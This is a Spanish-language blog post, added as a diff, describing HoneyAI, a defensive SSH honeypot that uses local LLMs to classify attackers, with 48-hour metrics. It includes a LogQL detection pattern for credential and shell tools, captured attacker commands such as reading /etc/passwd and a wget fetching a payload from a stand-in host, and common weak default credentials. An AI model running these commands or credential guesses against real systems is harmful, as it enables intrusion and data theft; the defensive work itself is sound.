@@ -1,0 +1,269 @@
+---
+title: 'HoneyAI: Honeypot SSH con Inteligencia Artificial Local'
+date: '2025-01-07T00:00:00'
+lastmod: '2025-01-07T00:00:00'
+summary: 'Sistema de detección de amenazas que combina honeypot SSH con IA local para clasificar atacantes en tiempo real'
+tags:
+  [
+    'honeypot',
+    'ssh',
+    'ia',
+    'threat-intelligence',
+    'ollama',
+    'cowrie',
+    'grafana',
+    'loki',
+    'n8n',
+    'telegram',
+    'proxmox',
+    'lxc',
+  ]
+draft: false
+authors: ['default']
+images: ['/static/images/og-default.png']
+---
+
+## 1. Introducción
+
+Tres mil intentos de intrusión en 48 horas. Ochenta direcciones IP diferentes tratando de comprometer un servidor SSH. Comandos diseñados para instalar malware, exfiltrar datos sensibles y establecer persistencia. Bienvenido a mi honeypot.
+
+**HoneyAI** es un sistema de detección y análisis de amenazas que combina un honeypot SSH de media interacción con inteligencia artificial local para clasificar atacantes en tiempo real. No es un experimento académico: es infraestructura en producción expuesta a Internet, capturando y analizando ataques reales las 24 horas.
+
+> **Note:** Este post documenta resultados reales de producción. Todas las métricas, IPs y comandos provienen de datos capturados entre el 5 y 7 de enero de 2025.
+
+## 2. El Problema con los Honeypots Tradicionales
+
+Los honeypots son excelentes para capturar actividad maliciosa, pero tienen limitaciones importantes:
+
+- **Volumen sin contexto**: Miles de conexiones diarias, pero ¿cuáles importan realmente?
+- **Análisis manual**: Revisar logs de ataques consume tiempo que podría dedicarse a investigación
+- **Alertas ruidosas**: Sin clasificación inteligente, terminas con fatiga de alertas
+- **Falta de inteligencia**: Los logs crudos no cuentan la historia del atacante
+
+La pregunta clave no es solo "¿quién me está atacando?" sino "¿qué tipo de amenaza representa este actor?"
+
+> **Lesson Learned:** Después de semanas revisando logs manualmente, me di cuenta que necesitaba automatización inteligente. El 70% de las conexiones son ruido sin valor analítico.
+
+## 3. La Solución: Arquitectura Híbrida con IA Local
+
+HoneyAI implementa una arquitectura distribuida que combina captura continua en Proxmox (24/7) con análisis de IA on-demand en una workstation local. La infraestructura completa corre sobre LXC containers en Proxmox con Ollama ejecutándose en hardware dedicado cuando se necesita análisis profundo.
+
+### 3.1 Stack Tecnológico
+
+**Captura y Emulación:**
+
+- **Cowrie**: Honeypot SSH/Telnet de media interacción. Emula un sistema Linux completo con filesystem virtual, captura credenciales, comandos y archivos descargados. Configurado para simular un servidor interno con usuarios y servicios convincentes.
+
+**Observabilidad:**
+
+- **Grafana Loki**: Almacenamiento y query de logs con LogQL. Retención de 30 días, indexación por labels (IP origen, evento, clasificación).
+- **Grafana**: Visualización en tiempo real con dashboards personalizados. Métricas de sesiones, comandos peligrosos, intentos de credenciales y timeline de ataques.
+
+**Orquestación:**
+
+- **n8n**: Motor de automatización que coordina el pipeline completo. Consulta Loki cada 5 minutos, detecta nuevas sesiones, verifica disponibilidad de la IA y dispara análisis o encola en Redis si el modelo está offline.
+
+**Inteligencia Artificial:**
+
+- **Ollama**: Motor de inferencia local ejecutando modelos LLaMA 3.2 (3B) para clasificación rápida y Qwen 2.5 (14B) para análisis profundo. Sin costos recurrentes, sin límites de rate, datos sensibles permanecen locales.
+
+**Alertas:**
+
+- **Telegram Bot**: Notificaciones instantáneas de comandos peligrosos y clasificaciones de amenazas. Alertas contextualizadas con IP, comandos ejecutados y nivel de peligrosidad.
+
+![Dashboard de HoneyAI mostrando actividad en tiempo real](/images/blog/2025-01-07-honeyai-honeypot-ssh-ia-local/honeyai-dashboard-live.png)
+
+### 3.2 Arquitectura de Red
+
+La infraestructura completa corre en 3 LXC containers sobre Proxmox VE:
+
+**LXC 100 (honeyai-core)**: Cowrie + Promtail  
+2GB RAM, 2 vCPU, expuesto a Internet en puerto 2222
+
+**LXC 101 (honeyai-orch)**: n8n + Scripts de análisis + Redis  
+2GB RAM, 2 vCPU, orquestación y lógica de negocio
+
+**LXC 102 (honeyai-mon)**: Loki + Grafana  
+1.5GB RAM, 1 vCPU, observabilidad y visualización
+
+**Workstation E16**: Ollama + modelos LLM  
+64GB RAM, análisis IA on-demand cuando está disponible
+
+> **Warning:** El honeypot tiene acceso limitado solo a Loki para envío de logs. No puede alcanzar otros servicios internos ni navegar libremente, cumpliendo con principios de zero trust.
+
+## 4. Resultados Reales: 48 Horas en Producción
+
+Las métricas no mienten. Desde que expuse el honeypot a Internet en el puerto 2222:
+
+- **2,776 sesiones totales**: Conexiones SSH capturadas
+- **80 IPs únicas**: Origen distribuido globalmente
+- **2,684 intentos de login**: Fuerza bruta automatizada
+- **72 comandos ejecutados**: Post-compromiso simulado
+- **30 logins exitosos**: Acceso al honeypot con credenciales débiles
+
+Los atacantes llegaron en las primeras horas. Sin publicidad, sin scanners propios buscándolos. Simplemente expuse un puerto SSH a Internet y el tráfico malicioso llegó solo.
+
+> **Lesson Learned:** Primera conexión maliciosa a los 15 minutos de exposición. Los scanners de Internet son implacables y encuentran cualquier puerto expuesto casi instantáneamente.
+
+### 4.1 Comandos Detectados
+
+El sistema identifica automáticamente comandos peligrosos mediante expresiones regulares en LogQL:
+
+```logql
+{job="cowrie"} |= "command.input" | json
+| input=~".*(shadow|passwd|wget|curl http|nc -|netcat|/tmp/|chmod|id_rsa|sh).*"
+```
+
+**Categorías detectadas:**
+
+- **Acceso a archivos sensibles**: `cat /etc/passwd`, `cat /etc/shadow`, acceso a claves SSH
+- **Descarga de payloads**: `wget http://`, `curl` desde URLs sospechosas
+- **Reverse shells**: `nc -`, `netcat`, `bash -i`
+- **Persistencia**: Modificación de `/tmp/`, cambio de permisos con `chmod`
+
+Ejemplos reales capturados:
+
+```bash
+cat /etc/passwd
+echo "cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps" | sh
+wget http://malicious-domain.fake/payload.sh
+```
+
+### 4.2 Análisis de Credenciales
+
+Las credenciales más intentadas revelan patrones preocupantes:
+
+```
+root:root
+admin:admin
+pi:raspberry
+test:test
+ubuntu:ubuntu
+```
+
+> **Tip:** Las credenciales débiles siguen siendo efectivas. `root:root`, `admin:admin`, `pi:raspberry` capturan logins exitosos diariamente. Los ataques de diccionario son vigentes en 2025.
+
+## 5. Análisis con IA: De Logs a Inteligencia
+
+El verdadero valor está en la clasificación automática. Cada sesión capturada pasa por el siguiente pipeline:
+
+![Workflow de n8n coordinando captura, análisis y alertas](/images/blog/2025-01-07-honeyai-honeypot-ssh-ia-local/honeyai-n8n-workflow.png)
+
+### 5.1 Pipeline de Análisis
+
+**Pipeline completo:**
+
+1. **Detección**: n8n consulta Loki cada 5 minutos buscando nuevas sesiones
+2. **Health check**: Verifica si Ollama está disponible (workstation encendida)
+3. **Parsing**: Extrae comandos, credenciales intentadas, duración de sesión
+4. **Clasificación IA**:
+   - Modelo rápido (llama3.2:3b) para clasificación inicial en ~20 segundos
+   - Modelo profundo (qwen2.5:14b) solo para amenazas sospechosas
+5. **Almacenamiento**: Resultados guardados en Loki con labels de clasificación
+6. **Alertas**: Notificaciones a Telegram para amenazas de nivel medio o superior
+
+### 5.2 Clasificaciones Generadas
+
+**Categorías de amenazas:**
+
+- **BOT/Scanner**: Conexiones automatizadas sin interacción real (~70% del tráfico)
+- **Script Kiddie**: Comandos básicos, errores frecuentes, herramientas conocidas
+- **Reconnaissance**: Enumeración sistemática, comandos de reconocimiento avanzado
+- **APT/Targeted**: Técnicas evasivas, persistencia, TTPs sofisticadas
+
+El análisis genera un `blog_headline` quoteable y `reasoning` en español para facilitar la generación de contenido técnico. Cada clasificación incluye indicadores de comportamiento y recomendaciones de respuesta.
+
+> **Note:** La IA local es viable. Ollama con modelos cuantizados (Q4_K_M) entrega clasificaciones útiles en ~20 segundos sin costos recurrentes ni envío de datos sensibles a la nube.
+
+## 6. Alertas en Tiempo Real
+
+Las alertas llegan a Telegram en menos de 3 minutos desde que el comando se ejecuta en el honeypot. Sin fatiga de alertas: solo se notifican comandos que cumplen criterios de peligrosidad.
+
+![Alerta instantánea en Telegram de comando peligroso detectado](/images/blog/2025-01-07-honeyai-honeypot-ssh-ia-local/honeyai-telegram-alert.png)
+
+### 6.1 Contenido de Alertas
+
+La notificación incluye:
+
+- IP atacante (con geolocalización cuando está disponible)
+- Comando ejecutado exacto
+- Timestamp con zona horaria
+- Link directo al dashboard de Grafana para análisis profundo
+- ID de sesión para correlación
+
+**Comandos que disparan alertas inmediatas:**
+
+- Acceso a `/etc/shadow` o `/etc/passwd`
+- Descarga de archivos vía `wget`/`curl`
+- Comandos de red (`netstat`, `ifconfig`, `iptables`)
+- Intentos de reverse shell
+- Modificación de crontabs o servicios systemd
+
+> **Tip:** La observabilidad importa. Loki + Grafana transforman logs crudos en inteligencia accionable. LogQL permite queries complejas sin bases de datos pesadas.
+
+## 7. Lecciones Aprendidas
+
+### 7.1 Los Atacantes Son Rápidos
+
+Primera conexión maliciosa a los 15 minutos de exposición. Los scanners de Internet son implacables.
+
+### 7.2 La Automatización Es Mayoritaria
+
+~70% de las conexiones son bots escaneando puertos. El análisis IA ayuda a filtrar ruido y enfocarse en amenazas reales.
+
+### 7.3 Las Credenciales Débiles Siguen Siendo Efectivas
+
+`root:root`, `admin:admin`, `pi:raspberry` capturan logins exitosos diariamente. Los ataques de diccionario son vigentes.
+
+### 7.4 La IA Local Es Viable
+
+Ollama con modelos cuantizados (Q4_K_M) entrega clasificaciones útiles en ~20 segundos sin costos recurrentes ni envío de datos sensibles a la nube.
+
+### 7.5 La Observabilidad Importa
+
+Loki + Grafana transforman logs crudos en inteligencia accionable. LogQL permite queries complejas sin bases de datos pesadas.
+
+> **Lesson Learned:** La automatización es mayoritaria. ~70% de las conexiones son bots escaneando puertos. El análisis IA ayuda a filtrar ruido y enfocarse en amenazas reales.
+
+## 8. Próximos Pasos
+
+HoneyAI es un proyecto en evolución. El siguiente post cubrirá **simulación de ataques ransomware**: recrear las fases de un ataque completo (reconocimiento, movimiento lateral, cifrado) dentro del honeypot para generar TTPs realistas y casos de estudio para blue teams.
+
+### 8.1 Integraciones Pendientes
+
+- [ ] Integración con MISP para compartir IOCs con la comunidad
+- [ ] Fingerprinting comportamental para identificar actores recurrentes
+- [ ] Enrichment con threat intelligence APIs (GreyNoise, AbuseIPDB)
+- [ ] Análisis de malware descargado con sandboxing automático
+
+### 8.2 Contenido Futuro
+
+- **Post 2**: Simulación de ataques ransomware en HoneyAI
+- **Post 3**: Integración con MISP para threat intelligence compartida
+- **Post 4**: Análisis forense de malware capturado
+
+## 9. Conclusión
+
+HoneyAI demuestra que la combinación de honeypots tradicionales con IA local genera inteligencia accionable sin depender de servicios cloud. Los resultados de 48 horas en producción validan la arquitectura: 2,776 sesiones capturadas, 80 IPs únicas, y clasificación automática de amenazas sin costos recurrentes.
+
+**TL;DR:**
+
+- ✅ 2,776 sesiones capturadas en 48 horas
+- ✅ Clasificación automática con IA local (Ollama)
+- ✅ Alertas en tiempo real vía Telegram
+- ✅ Arquitectura distribuida en LXC containers
+- ✅ Zero costos recurrentes, datos sensibles permanecen locales
+
+> **Tip:** Los atacantes son rápidos. Primera conexión maliciosa a los 15 minutos de exposición. Si vas a montar un honeypot, preparate para tráfico inmediato.
+
+---
+
+**Recursos:**
+
+- **Código**: Disponible próximamente en GitHub
+- **Dashboards**: Exportados en formato JSON para importación directa
+- **Prompts de IA**: Templates optimizados para clasificación de atacantes
+
+_Este es el primer post de una serie técnica sobre threat intelligence y análisis de honeypots. El proyecto completo está documentado con arquitectura, decisiones técnicas y resultados cuantificables._
+
+_Infraestructura: Proxmox VE 8.x | Debian 12 | Cowrie 2.9.3 | Loki 2.9.3 | Grafana 12.3.1 | n8n 2.1.4 | Ollama (llama3.2:3b, qwen2.5:14b)_
